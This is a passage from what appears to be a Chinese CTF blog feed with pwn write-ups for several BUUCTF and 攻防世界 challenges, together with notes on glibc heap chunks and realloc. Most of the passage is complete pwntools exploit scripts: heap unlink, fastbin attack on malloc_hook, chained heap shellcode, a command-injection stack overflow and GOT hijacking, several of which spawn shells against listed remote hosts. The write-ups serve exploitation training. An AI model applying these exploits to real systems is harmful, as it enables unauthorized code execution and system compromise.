class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment">#p = remote(&quot;node4.buuoj.cn&quot;,26925)</span><br>p = process(<span class="hljs-string">&quot;./stkof&quot;</span>,env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>:<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>&#125;)<br>elf = ELF(<span class="hljs-string">&quot;./stkof&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc-2.23.so&quot;</span>)<br>puts_plt=elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>puts_got=elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>free=elf.got[<span class="hljs-string">&#x27;free&#x27;</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size</span>):<br>    p.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(size))<br>    p.recvuntil(<span class="hljs-string">&#x27;OK\n&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,size,content</span>):<br>    p.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br>    p.sendline(<span class="hljs-built_in">str</span>(size))<br>    p.send(content)<br>    p.recvuntil(<span class="hljs-string">&#x27;OK\n&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    p.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br>add(<span class="hljs-number">0x100</span>)   <span class="hljs-comment">#1</span><br>add(<span class="hljs-number">0x20</span>)    <span class="hljs-comment">#2</span><br>add(<span class="hljs-number">0x80</span>)    <span class="hljs-comment">#3</span><br>ptr=<span class="hljs-number">0x602150</span><br>payload=p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x21</span>)+p64(ptr-<span class="hljs-number">0x18</span>)+p64(ptr-<span class="hljs-number">0x10</span>)+p64(<span class="hljs-number">0x20</span>)+p64(<span class="hljs-number">0x90</span>)<br>edit(<span class="hljs-number">2</span>,<span class="hljs-built_in">len</span>(payload),payload)     <span class="hljs-comment">#fake chunk</span><br>delete(<span class="hljs-number">3</span>)               <span class="hljs-comment">#unlink</span><br>p.recvuntil(<span class="hljs-string">&#x27;OK&#x27;</span>)<br><br>payload=p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+p64(free)+p64(ptr-<span class="hljs-number">0x18</span>)+p64(puts_got)<br>edit(<span class="hljs-number">2</span>,<span class="hljs-built_in">len</span>(payload),payload)<br>edit(<span class="hljs-number">1</span>,<span class="hljs-number">8</span>,p64(puts_plt))          <span class="hljs-comment">#劫持free got地址为puts plt</span><br>delete(<span class="hljs-number">3</span>)<span class="hljs-comment">#输出puts got地址</span><br>puts_addr=u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(puts_addr))<br>base=puts_addr-libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]    <span class="hljs-comment">#libc加载基址</span><br>p.recvuntil(<span class="hljs-string">&#x27;OK&#x27;</span>)<br>system_addr=base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>payload=p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0</span>)+p64(free)+p64(ptr-<span class="hljs-number">0x18</span>)+p64(ptr+<span class="hljs-number">0x10</span>)+<span class="hljs-string">b&quot;/bin/sh&quot;</span><br>edit(<span class="hljs-number">2</span>,<span class="hljs-built_in">len</span>(payload),payload)<br>edit(<span class="hljs-number">1</span>,<span class="hljs-number">8</span>,p64(system_addr))         <span class="hljs-comment">#劫持free got地址为system地址</span><br>delete(<span class="hljs-number">3</span>)            <span class="hljs-comment">#执行system(&quot;/bin/sh&quot;)</span><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="roarctf-2019-easy-pwn⭐"><a href="#roarctf-2019-easy-pwn⭐" class="headerlink" title="roarctf_2019_easy_pwn⭐"></a>roarctf_2019_easy_pwn⭐</h3><h4 id="off-by-one、chunk-overlap、unsorted-bin-attack、fastbin-attack"><a href="#off-by-one、chunk-overlap、unsorted-bin-attack、fastbin-attack" class="headerlink" title="off-by-one、chunk overlap、unsorted bin attack、fastbin attack"></a>off-by-one、chunk overlap、unsorted bin attack、fastbin attack</h4><p><img src="/2023/05/04/buuctf-pwn/image-20230421101813357.png" alt="image-20230421101813357"></p><p>步骤总结：</p><ol><li>off-by-one实现chunk overlap，通过操作chunk1 可以操作chunk2；</li><li>free chunk2进入unsorted bin，通过show chunk1 得到main_arena+88地址，泄漏libc；</li><li>申请chunk2 0x80并再次free 进入fastbin，通过edit chunk1将包含malloc_hook的fake chunk加入fatbin；</li><li>两次申请后得到fake chunk，修改malloc_hook为onegadget。</li></ol><p><strong>注意：每次free fake chunk会检查下一个chunk的prev_size、size</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> * <br><br><span class="hljs-comment">#context.log_level = &quot;debug&quot;</span><br>p = process(<span class="hljs-string">&quot;./easy_pwn&quot;</span>,env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>:<span class="hljs-string">&quot;./libc-2.23-64.so&quot;</span>&#125;)<br><span class="hljs-comment">#p = remote(&quot;node4.buuoj.cn&quot;, 27446)</span><br>elf = ELF(<span class="hljs-string">&quot;./easy_pwn&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;libc-2.23-64.so&quot;</span>) <br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>(<span class="hljs-params">idx</span>):<br>p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size</span>):<br>menu(<span class="hljs-number">1</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;size: &quot;</span>,<span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,size,content</span>):<br>menu(<span class="hljs-number">2</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;index: &quot;</span>,<span class="hljs-built_in">str</span>(idx))<br>p.sendlineafter(<span class="hljs-string">&quot;size: &quot;</span>,<span class="hljs-built_in">str</span>(size))<br>p.sendlineafter(<span class="hljs-string">&quot;content: &quot;</span>,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>menu(<span class="hljs-number">3</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;index: &quot;</span>,<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>menu(<span class="hljs-number">4</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;index: &quot;</span>,<span class="hljs-built_in">str</span>(idx))<br><br>add(<span class="hljs-number">0x18</span>)               <span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x10</span>)               <span class="hljs-comment">#1</span><br>add(<span class="hljs-number">0x90</span>)               <span class="hljs-comment">#2</span><br>add(<span class="hljs-number">0x10</span>)               <span class="hljs-comment">#3</span><br>payload = <span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">0x10</span> + p64(<span class="hljs-number">0x20</span>) + p8(<span class="hljs-number">0xa1</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x18</span>+<span class="hljs-number">10</span>,payload)                        <span class="hljs-comment">#off-by-one，修改chunk1的size=0xa1</span><br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">0xe</span> + p64(<span class="hljs-number">0xa0</span>) + p64(<span class="hljs-number">0x21</span>)<br>edit(<span class="hljs-number">2</span>,<span class="hljs-number">0x80</span>,payload)                           <span class="hljs-comment">#修改chunk2，伪造prev_size和size</span><br>delete(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0x90</span>)                                      <span class="hljs-comment">#重新申请的chunk1和chunk2 overlap</span><br><br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(<span class="hljs-number">0xa1</span>)<br>edit(<span class="hljs-number">1</span>,<span class="hljs-number">0x20</span>,payload)                           <span class="hljs-comment">#calloc置零，恢复chunk2 size</span><br>delete(<span class="hljs-number">2</span>)                                      <span class="hljs-comment">#free chunk2进入unsortbin</span><br>show(<span class="hljs-number">1</span>)<br>libc_base = u64(p.recvuntil(<span class="hljs-string">b&quot;\x7f&quot;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>)) - <span class="hljs-number">0x3c4b78</span>            <span class="hljs-comment">#获得main_arena+88地址</span><br>malloc_hook = libc.sym[<span class="hljs-string">&quot;__malloc_hook&quot;</span>] + libc_base<br>realloc = libc.sym[<span class="hljs-string">&quot;realloc&quot;</span>] + libc_base<br><br>add(<span class="hljs-number">0x80</span>)             <span class="hljs-comment">#申请chunk2                               </span><br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span>+p64(<span class="hljs-number">0x71</span>)+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">12</span> + p64(<span class="hljs-number">0x70</span>) + p64(<span class="hljs-number">0x21</span>)<br>edit(<span class="hljs-number">1</span>,<span class="hljs-number">0x90</span>,payload)                                             <span class="hljs-comment">#修改chunk1，伪造prev_size和size</span><br>delete(<span class="hljs-number">2</span>)                 <span class="hljs-comment">#chunk2进入fastbin</span><br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(<span class="hljs-number">0x71</span>) + p64(malloc_hook - <span class="hljs-number">0x23</span>)*<span class="hljs-number">2</span>                    <span class="hljs-comment">#fastbin attack</span><br>edit(<span class="hljs-number">1</span>,<span class="hljs-number">0x30</span>,payload)<br>add(<span class="hljs-number">0x60</span>)<br>add(<span class="hljs-number">0x60</span>)     <span class="hljs-comment">#申请得到fake chunk</span><br>one_gadget = libc_base + <span class="hljs-number">0xf1147</span><br>payload = <span class="hljs-string">b&quot;a&quot;</span>*<span class="hljs-number">11</span> + p64(one_gadget) + p64(realloc+<span class="hljs-number">4</span>)    <span class="hljs-comment">#通过realloc修改malloc_hook为onegaget</span><br>edit(<span class="hljs-number">4</span>,<span class="hljs-number">27</span>,payload)<br>add(<span class="hljs-number">0x60</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>通过 realloc_hook 调整栈帧使 onegadget 生效，将 malloc_hook 劫持为 realloc ，realloc_hook 劫持为 onegadget ，实际运行顺序：</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xl"><span class="hljs-function"><span class="hljs-title">malloc</span> -&gt;</span><span class="hljs-function"><span class="hljs-title">malloc_hook</span> -&gt;</span> <span class="hljs-function"><span class="hljs-title">realloc</span> -&gt;</span> <span class="hljs-function"><span class="hljs-title">realloc_hook</span> -&gt;</span> onegadget<br></code></pre></td></tr></table></figure><p>原理：realloc函数一开始有很多的 push ，realloc 函数先执行 push 压栈，然后再跳转执行 realloc_hook 存储的函数。我们就是利用这些 push  调整栈帧。push 的数量发生变化会影响 rsp 的地址（一个 push ，rsp 就会向前移动一个内存单元），这样就可以控制 rsp 的取值，从而满足 onegadget 的执行条件。</p><p><a href="https://blog.csdn.net/Maxmalloc/article/details/102535427">https://blog.csdn.net/Maxmalloc/article/details/102535427</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>攻防世界-pwn进阶</title>
    <link href="/2023/04/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn%E8%BF%9B%E9%98%B6/"/>
    <url>/2023/04/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn%E8%BF%9B%E9%98%B6/</url>
    
    <content type="html"><![CDATA[<h3 id="note-service2"><a href="#note-service2" class="headerlink" title="note-service2"></a>note-service2</h3><h4 id="数组越界、chunk数据结构"><a href="#数组越界、chunk数据结构" class="headerlink" title="数组越界、chunk数据结构"></a>数组越界、chunk数据结构</h4><p>存在数组越界的漏洞，且NX保护关闭，堆栈可执行。思路：申请一些堆块并写入shellcode，将free函数的got表修指向堆块shell，调用该函数时运行shellcode。</p><p><img src="/2023/04/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn%E8%BF%9B%E9%98%B6/image-20230329154647206.png" alt="image-20230329154647206"></p><h4 id="⭐chunk"><a href="#⭐chunk" class="headerlink" title="⭐chunk"></a>⭐chunk</h4><p>在程序的执行过程中，我们称由 malloc 申请的内存为 chunk 。这块内存在 ptmalloc 内部用 malloc_chunk 结构体来表示。c函数申请堆内存时，可以使用的内存的起始地址是从fd成员开始的，所以用户无法访问结构体的前两个成员。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/*</span><br><span class="hljs-comment">  This struct declaration is misleading (but accurate and necessary).</span><br><span class="hljs-comment">  It declares a &quot;view&quot; into memory allowing access to necessary</span><br><span class="hljs-comment">  fields at known offsets from a given base. See explanation below.</span><br><span class="hljs-comment">*/</span><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">malloc_chunk</span> &#123;<br><br>  INTERNAL_SIZE_T      prev_size;  <span class="hljs-comment">/* Size of previous chunk (if free).  */</span><br>  INTERNAL_SIZE_T      size;       <span class="hljs-comment">/* Size in bytes, including overhead. */</span><br><br>  <span class="hljs-keyword">struct</span> <span class="hljs-title class_">malloc_chunk</span>* fd;         <span class="hljs-comment">/* double links -- used only if free. */</span><br>  <span class="hljs-keyword">struct</span> <span class="hljs-title class_">malloc_chunk</span>* bk;<br><br>  <span class="hljs-comment">/* Only used for large blocks: pointer to next larger size.  */</span><br>  <span class="hljs-keyword">struct</span> <span class="hljs-title class_">malloc_chunk</span>* fd_nextsize; <span class="hljs-comment">/* double links -- used only if free. */</span><br>  <span class="hljs-keyword">struct</span> <span class="hljs-title class_">malloc_chunk</span>* bk_nextsize;<br>&#125;;<br></code></pre></td></tr></table></figure><p>当用户申请size大小的堆块时，在glibc中本质上是申请了size+16大小（64位系统中）的内存，因为要加上前两个成员。</p><p>例如：malloc(0x10)，申请了0x10大小的堆内存，本质上在glibc中申请了0x10+0x10&#x3D;0x20大小的空间。malloc的堆块大小在glibc中会加上前两个成员的大小，所以当你分配一个堆内存时，堆内存的最小大小一定为0x20（0x10+0x10）。</p><p>chunk 的大小必须是 2 * SIZE_SZ 的整数倍。如果申请的内存大小不是 2 * SIZE_SZ  的整数倍，会被转换满足大小的最小的 2 * SIZE_SZ 的倍数。32 位系统中，SIZE_SZ 是 4；64 位系统中，SIZE_SZ 是  8。</p><p><img src="/2023/04/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn%E8%BF%9B%E9%98%B6/image-20230329160848417.png"></p><p>现在我们想从 chunk0 的data区 jmp 跳到 chunk1 的 data 区执行新代码，那么我们 jmp short 后面的偏移为1+8+8+8&#x3D;25&#x3D;0x19，即\xeb\x19。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.update(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>)<br><span class="hljs-comment">#io=process(&quot;./noteservice&quot;)</span><br>io=remote(<span class="hljs-string">&#x27;223.112.5.156&#x27;</span>,<span class="hljs-number">65298</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index,content</span>):<br>    io.recvuntil(<span class="hljs-string">&quot;your choice&gt;&gt;&quot;</span>)<br>    io.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>    io.recvuntil(<span class="hljs-string">&quot;index:&quot;</span>)<br>    io.sendline(<span class="hljs-built_in">str</span>(index))<br>    io.recvuntil(<span class="hljs-string">&quot;size:&quot;</span>)<br>    io.sendline(<span class="hljs-string">&quot;8&quot;</span>)                         <span class="hljs-comment">#申请堆块8字节</span><br>    io.recvuntil(<span class="hljs-string">&quot;content:&quot;</span>)<br>    io.sendline(content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dele</span>(<span class="hljs-params">index</span>):<br>    io.recvuntil(<span class="hljs-string">&quot;your choice&gt;&gt;&quot;</span>)<br>    io.sendline(<span class="hljs-string">&quot;4&quot;</span>)<br>    io.recvuntil(<span class="hljs-string">&quot;index:&quot;</span>)<br>    io.sendline(<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-comment">#注意：此处asm返回的为bytes，为使得类型统一，后面的字符串要加b前缀</span><br>add(<span class="hljs-number">0</span>,<span class="hljs-string">&quot;/bin/sh&quot;</span>)<br>add(-<span class="hljs-number">17</span>,asm(<span class="hljs-string">&quot;xor rsi,rsi&quot;</span>)+<span class="hljs-string">b&quot;\x90\x90\xeb\x19&quot;</span>)      <span class="hljs-comment">#补齐7字节</span><br>add(<span class="hljs-number">1</span>,asm(<span class="hljs-string">&quot;mov eax, 0x3b&quot;</span>)+<span class="hljs-string">b&quot;\xeb\x19&quot;</span>)<br>add(<span class="hljs-number">2</span>,asm(<span class="hljs-string">&quot;xor rdx, rdx&quot;</span>)+<span class="hljs-string">b&quot;\x90\x90\xeb\x19&quot;</span>)<br>add(<span class="hljs-number">3</span>,asm(<span class="hljs-string">&quot;syscall&quot;</span>).ljust(<span class="hljs-number">7</span>,<span class="hljs-string">b&quot;\x90&quot;</span>))                <span class="hljs-comment">#左对齐，右侧补/x90 nop机器指令码</span><br>dele(<span class="hljs-number">0</span>)                                               <span class="hljs-comment">#菜单4选项，执行修改的free函数，参数为index0(/bin/sh)</span><br> <br>io.interactive()<br></code></pre></td></tr></table></figure><h3 id="secret-file"><a href="#secret-file" class="headerlink" title="secret_file"></a>secret_file</h3><h4 id="汇编、复制栈溢出"><a href="#汇编、复制栈溢出" class="headerlink" title="汇编、复制栈溢出"></a>汇编、复制栈溢出</h4><p><img src="/2023/04/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn%E8%BF%9B%E9%98%B6/image-20230329200310123.png" alt="image-20230329200310123"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha256<br><br><span class="hljs-comment"># r = process(&quot;./secret_file&quot;)</span><br>r = remote(<span class="hljs-string">&#x27;61.147.171.105&#x27;</span>, <span class="hljs-number">53191</span>)<br>junk = cyclic(<span class="hljs-number">0x100</span>)<br>payload = junk + <span class="hljs-string">b&quot;ls;cat flag.txt;&quot;</span>.ljust(<span class="hljs-number">27</span>, <span class="hljs-string">b&quot; &quot;</span>) + sha256(junk).hexdigest().encode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br>r.sendline(payload)<br>r.interactive()<br></code></pre></td></tr></table></figure><h3 id="supermarket"><a href="#supermarket" class="headerlink" title="supermarket"></a>supermarket</h3><h4 id="堆UAF、realloc"><a href="#堆UAF、realloc" class="headerlink" title="堆UAF、realloc"></a>堆UAF、realloc</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp">realloc原型是<span class="hljs-function"><span class="hljs-keyword">extern</span> <span class="hljs-type">void</span> *<span class="hljs-title">realloc</span><span class="hljs-params">(<span class="hljs-type">void</span> *mem_address, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> newsize)</span></span>;<br>先判断当前的指针是否有足够的连续空间，如果有，扩大mem_address指向的地址，并且将mem_address返回，如果空间不够，先按照newsize指定的大小分配空间，将原有数据从头到尾拷贝到新分配的内存区域，而后释放原来mem_address所指内存区域（注意：原来指针是自动释放，不需要使用free），同时返回新分配的内存区域的首地址。即重新分配存储器块的地址。<br></code></pre></td></tr></table></figure><p>realloc如果空间不够的话重新分配，当chunk0下面有其他chunk时，就会丢弃原来位置的chunk并<strong>free</strong>它，然后在最后面再申请一个大于原size的chunk；当chunk0后面没有其他chunk时，就会原地扩充大小。</p><p><img src="/2023/04/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn%E8%BF%9B%E9%98%B6/image-20230330094304618.png" alt="image-20230330094304618"></p><p><img src="/2023/04/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn%E8%BF%9B%E9%98%B6/image-20230330094043125.png" alt="image-20230330094043125"></p><p>思路：通过realloc让Node0-&gt;description指向Node2，通过修改Node0-&gt;description的值从而修改Node2-&gt;description指向的内存区域。这个值指向atoi的got地址，从而泄露atoi的地址并修改它为system的got地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context(log_level=<span class="hljs-string">&quot;debug&quot;</span>,arch=<span class="hljs-string">&quot;i386&quot;</span>,os=<span class="hljs-string">&quot;linux&quot;</span>)<br>r = remote(<span class="hljs-string">&quot;61.147.171.105&quot;</span>,<span class="hljs-number">50277</span>)<br>elf = ELF(<span class="hljs-string">&quot;./supermarket&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br>atoi_got = elf.got[<span class="hljs-string">&#x27;atoi&#x27;</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add1</span>(<span class="hljs-params">index,size,content</span>):<br>    r.sendlineafter(<span class="hljs-string">&#x27;your choice&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    r.sendlineafter(<span class="hljs-string">&#x27;name:&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br>    r.sendlineafter(<span class="hljs-string">&#x27;price:&#x27;</span>,<span class="hljs-string">&#x27;10&#x27;</span>)<br>    r.sendlineafter(<span class="hljs-string">&#x27;descrip_size:&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    r.sendlineafter(<span class="hljs-string">&#x27;description:&#x27;</span>,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">del1</span>(<span class="hljs-params">index</span>):<br>    r.sendlineafter(<span class="hljs-string">&#x27;your choice&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    r.sendlineafter(<span class="hljs-string">&#x27;name:&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">list1</span>():<br>    r.sendlineafter(<span class="hljs-string">&#x27;your choice&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit1</span>(<span class="hljs-params">index,size,content</span>):<br>    r.sendlineafter(<span class="hljs-string">&#x27;your choice&gt;&gt;&#x27;</span>,<span class="hljs-string">&#x27;5&#x27;</span>)<br>    r.sendlineafter(<span class="hljs-string">&#x27;name:&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br>    r.sendlineafter(<span class="hljs-string">&#x27;descrip_size:&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    r.sendlineafter(<span class="hljs-string">&#x27;description:&#x27;</span>,content)<br><br>add1(<span class="hljs-number">0</span>,<span class="hljs-number">0x80</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>)<br>add1(<span class="hljs-number">1</span>,<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">0x10</span>)<br><span class="hljs-comment">#realloc node0-&gt;description</span><br><span class="hljs-comment">#realloc的空间要比原来node0申请的空间大,UAF</span><br><span class="hljs-comment">#程序函数中加数据会写入到原chunk（free），再次申请（node2）会出错</span><br>edit1(<span class="hljs-number">0</span>,<span class="hljs-number">0x90</span>,<span class="hljs-string">&#x27;000&#x27;</span>)<br><span class="hljs-comment">#将node2分配到node0-&gt;description</span><br>add1(<span class="hljs-number">2</span>,<span class="hljs-number">0x20</span>,<span class="hljs-string">&#x27;d&#x27;</span>*<span class="hljs-number">0x10</span>)<br>payload = <span class="hljs-string">b&#x27;2&#x27;</span>.ljust(<span class="hljs-number">16</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>) + p32(<span class="hljs-number">20</span>) + p32(<span class="hljs-number">0x20</span>) + p32(atoi_got)<br><span class="hljs-comment">#realloc返回的指针没有赋给node0-&gt;description,即node0-&gt;description还是原来的地址，存的是node2</span><br><span 